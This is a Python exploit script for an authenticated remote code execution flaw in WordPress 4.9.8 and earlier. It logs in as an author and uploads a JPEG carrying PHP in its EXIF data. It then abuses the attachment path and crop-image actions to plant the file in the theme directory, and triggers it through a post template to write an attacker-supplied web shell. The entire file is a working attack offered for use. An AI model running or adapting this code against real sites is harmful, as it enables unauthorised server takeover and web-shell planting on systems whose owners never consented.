import requests
import os
import base64
import piexif
import re
import datetime
import sys


class Exploit(object):

    def __init__(self, target_url, username, password, target_shell):
        self.url = target_url if target_url.endswith("/") else target_url + "/"
        self.username = username
        self.password = password
        self.target_shell = target_shell

        # set up URLs for easier requests later
        self.login_url = self.url + "wp-login.php"
        self.admin_url = self.url + "wp-admin/"
        self.media_url = self.admin_url + "media-new.php"
        self.upload_url = self.admin_url + "async-upload.php"
        self.edit_post_url = self.admin_url + "post.php"
        self.ajax_url = self.admin_url + "admin-ajax.php"
        self.new_post_url = self.admin_url + "post-new.php"


    def create_payload(self):
        # Create an image in /tmp from base64
        base64_of_image = ""
        imageblob = base64.b64decode(base64_of_image)
        imgfile = open('payload.jpeg', 'wb')
        imgfile.write(imageblob)
        imgfile.close()

        # Create the payload generator
        targetshellf = open(self.target_shell, 'rb')
        b64shellcode = base64.b64encode(targetshellf.read()).decode('ASCII')
        payload_gen = "<?php file_put_contents('wp-content/themes/%s/%s', base64_decode('%s')); die; ?>" % (self.theme_slug, os.path.basename(self.target_shell), str(b64shellcode))

        # Edit the images exif data
        exif_data = piexif.load('payload.jpeg')
        exif_data['0th'][piexif.ImageIFD.ImageDescription] = payload_gen
        exif_bytes = piexif.dump(exif_data)
        piexif.insert(exif_bytes, 'payload.jpeg')

        print("[*] Created the malicious image in payload.jpeg")


    def get_template_path(self):
        print("[*] Attempting to get the currently active theme")
        response = requests.get(self.url)
        regex = re.compile(self.url + "wp-content/themes/([a-zA-Z0-9-_\.]+)/")
        matches = regex.findall(response.text)
        if not matches is None and matches:
            self.theme_slug = matches[0]
            print("[+] Detected current theme's slug: %s" % self.theme_slug)
        else:
            print("[-] Was not able to detect the currently active theme.")


    def authenticate(self):
        wp_session = requests.Session()
        data = {
            'log': self.username,
            'pwd': self.password,
            'wp-submit': 'Log In',
            'redirect_to': self.admin_url,
            'testcookie': '1'
        }

        print("[*] Attempting to log into the site")
        r = wp_session.get(self.login_url)
        r = wp_session.post(self.login_url, data=data)

        if not "wp-admin-bar-logout" in r.text:
            print("[-] Failed to authenticate to the site. Are the Credentials correct?")
            exit(1)

        print("[+] Successfully logged into the site")
        self.session = wp_session


    def _get_upload_nonce(self):
        response = self.session.get(self.media_url)
        regex = re.compile('name="_wpnonce" value="([a-zA-Z0-9]+)"')
        matches = regex.findall(response.text)
        if not matches is None and len(matches) > 0:
            return matches[0]
        else:
            print("[-] Failed to grab the upload nonce. Are you sure that your account is privileged enough to upload files?")
            exit(1)

    def _get_crop_nonce(self):
        response = self.session.get(self.edit_attachment_url)
        pattern = "imageEdit.open(\s*%d,\s*'\([a-zA-Z0-9]+)'\)" % self.attachment_id
        regex = re.compile("imageEdit.open\(\s*\d+,\s*['\"]([a-zA-Z0-9]+)['\"]")
        matches = regex.findall(response.text)
        if not matches is None and len(matches) > 0:
            return matches[0]
        else:
            print("[-] Failed to grab the image editor nonce.")

    def upload_payload(self):
        nonce = self._get_upload_nonce()
        data = {
            '_wpnonce': nonce,
            'name': 'payload.jpeg',
            'post_id': 0,
            'short': 1
        }

        files = {
            'async-upload': open('payload.jpeg', 'rb')
        }

        r = self.session.post(self.upload_url, data=data, files=files)
        self.attachment_id = int(r.text)

        # Verify that the image was actually uploaded
        now = datetime.datetime.now()
        self.attachment_url = self.url + "wp-content/uploads/%s/%s/payload.jpeg" % (now.year, now.month)
        r = requests.get(self.attachment_url)
        if r.status_code == 200:
            print("[+] Payload was successfully uploaded")
            self.edit_attachment_url = self.admin_url + "post.php?post=%d&action=edit" % self.attachment_id
        else:
            print("[-] The payload was not uploaded. Exiting.")
            exit(1)

    def _get_edit_attachment_nonce(self):
        response = self.session.get(self.edit_attachment_url)
        regex = re.compile('name="_wpnonce" value="([a-zA-Z0-9]+)"')
        matches = regex.findall(response.text)
        if not matches is None and len(matches) > 0:
            return matches[0]
        else:
            print("[-] Failed to get the nonce needed to edit the attachment")


    def update_attached_file(self, step):
        now = datetime.datetime.now()
        path = "%s/%s/" % (now.year, now.month)
        payload = 'payload.jpeg?/shell.jpeg' if step == 1 else 'payload.jpeg?/../../../../themes/twentyseventeen/shell.jpeg'
        payload = path + payload
        nonce = self._get_edit_attachment_nonce()
        data = {
            '_wpnonce': nonce,
            'post_ID': self.attachment_id,
            'meta_input[_wp_attached_file]': payload,
            'action': 'editpost',
            'debug': True
        }
        self.session.post(self.edit_post_url, data=data)
        print("[*] Updated attached file to %s" % payload)

    def crop_image(self):
        nonce = self._get_crop_nonce()
        data = {
            '_ajax_nonce': nonce,
            'id': self.attachment_id,
            'action': 'crop-image',

            'cropDetails[x1]': 100,
            'cropDetails[y1]': 100,
            'cropDetails[width]': 100,
            'cropDetails[height]': 100,
            'cropDetails[dst_width]': 100,
            'cropDetails[dst_height]': 100
        }

        response = self.session.post(self.ajax_url, data=data)
        print("[*] Cropped the image")

    def verify_jpeg_shell_exists(self):
        self.theme_url = self.url + "wp-content/themes/" + self.theme_slug
        r = requests.get(self.theme_url + "/cropped-shell.jpeg")
        if r.status_code == 200:
            print("[+] Confirmed that the malicious image has been planted into the theme directory")
        else:
            print("[-] The malicious image was not found within the theme directory. Maybe it isn't writable. Exiting")
            exit(1)

    def _get_new_post_nonce_and_id_and_referer(self):
        response = self.session.get(self.admin_url + "index.php")
        regex = re.compile('name="_wpnonce" value="([a-zA-Z0-9]+)"')
        matches = regex.findall(response.text)
        if not matches is None and len(matches) > 0:
            nonce = matches[0]
        else:
            print("[-] Failed to get the nonce needed to edit the attachment")
            exit(1)
        regex = re.compile('name=["\']post_ID["\'] value=["\'](\d+)["\']')
        matches = regex.findall(response.text)
        if not matches is None and len(matches) > 0:
            id = matches[0]
        else:
            print("[-] Failed to get the ID of the new post")
            exit(1)
        regex = re.compile('name=["\']_wp_http_referer["\'] value=["\']([^"\']+)["\']')
        matches = regex.findall(response.text)
        if not matches is None and len(matches) > 0:
            referer = matches[0]
        else:
            print("[-] Failed to get referer")
            exit(1)

        return (nonce, id, referer)

    def create_new_post(self):
        nonce, id, referer = self._get_new_post_nonce_and_id_and_referer()
        referer = referer.replace('index', 'post')
        data = {
            '_wpnonce': nonce,
            'action': 'post-quickdraft-save',
            'post_ID': id,
            'post_type': 'post',
            'post_title': '0wned by ze 0day',
            'content': '1337',
            '_wp_http_referer': referer,
            'meta_input[_wp_page_template]': 'cropped-shell.jpeg'

        }
        self.session.post(self.edit_post_url, data=data)
        self.exploit_post_id = id
        print("[*] Attempted to create the post carrying our payload - Now verifying if the exploit worked")


    def trigger_exploit(self):
        self.session.get(self.url + "?p=" + self.exploit_post_id + "&preview=true")


    def check_if_shell_exists(self):
        response = requests.get(self.theme_url + "/" + os.path.basename(self.target_shell))
        if response.status_code == 200:
            print("[+] Success! Your target file is now available at %s/%s" % (self.theme_url, os.path.basename(self.target_shell)))
        else:
            print("[-] Was not able to upload the target file")



    def run(self):
        self.get_template_path()
        self.create_payload()
        self.authenticate()
        self.upload_payload()
        self.update_attached_file(step=1)
        self.crop_image()
        self.update_attached_file(step=2)
        self.crop_image()
        self.verify_jpeg_shell_exists()
        self.create_new_post()
        self.trigger_exploit()
        self.check_if_shell_exists()


if __name__ == '__main__':
    usage = "WordPress <= 4.9.8 Remote Code Execution as Author Exploit (Vulnerability Research & Exploit Author: Simon Scannell (RIPS Technologies)\n\n"

    if len(sys.argv) != 5:
        usage += "Usage: %s target_wordpress_url username password path_to_file_that_should_be_uploaded\n" % sys.argv[0]
        usage += "Example: %s http://localhost/wordpress/ author p4assw0rd /tmp/shell.php" % sys.argv[0]
        print(usage)
        exit(1)

    print(usage)

    expl01t = Exploit(sys.argv[1], sys.argv[2], sys.argv[3], sys.argv[4])
    expl01t.run()


